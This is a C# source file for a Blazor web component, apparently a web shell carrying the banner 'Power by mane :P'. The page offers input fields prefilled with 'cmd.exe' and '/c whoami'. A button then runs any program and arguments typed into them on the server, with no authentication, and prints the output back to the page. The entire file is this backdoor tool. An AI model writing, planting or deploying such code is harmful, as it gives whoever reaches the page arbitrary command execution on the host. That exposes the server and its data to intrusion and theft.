using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using System.Diagnostics;

namespace mane
{
    public class Component: ComponentBase
    {
        public string runProgram { get; set; } = "cmd.exe";
        public string runProgramArgv { get; set; } = "/c whoami";
        public string result { get; set; } = "No Result";
        protected override void BuildRenderTree(RenderTreeBuilder builder)
        {
            // build header
            builder.OpenElement(0, "div");
            builder.AddMarkupContent(1, "<h1>Power by mane :P </h1>");
            builder.CloseElement();

            // build input
            builder.OpenElement(2, "input");
            builder.AddAttribute(3, "value", Microsoft.AspNetCore.Components.BindConverter.FormatValue(runProgram));
            builder.AddAttribute(4, "oninput", Microsoft.AspNetCore.Components.EventCallback.Factory.CreateBinder(this, __value => runProgram = __value, runProgram));
            builder.CloseElement();

            // build input argv
            builder.OpenElement(5, "input");
            builder.AddAttribute(6, "value", Microsoft.AspNetCore.Components.BindConverter.FormatValue(runProgramArgv));
            builder.AddAttribute(7, "oninput", Microsoft.AspNetCore.Components.EventCallback.Factory.CreateBinder(this, __value => runProgramArgv = __value, runProgramArgv));
            builder.CloseElement();

            // build button
            builder.OpenElement(8, "button");
            builder.AddAttribute(9, "onclick", EventCallback.Factory.Create(this, ButtonClickAsync));
            builder.AddContent(10, "Submit");
            builder.CloseElement();

            // build output
            builder.OpenElement(11, "pre");
            builder.AddContent(12, result);
            builder.CloseElement();

            // build render tree
            base.BuildRenderTree(builder);
        }

        private void ButtonClickAsync()
        {
            Process process = new Process();

            process.StartInfo.FileName = runProgram;
            process.StartInfo.Arguments = runProgramArgv;

            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
            string err = process.StandardError.ReadToEnd();
            Console.WriteLine(err);

            result = output + "\n" + err;

            StateHasChanged();
        }
    }
}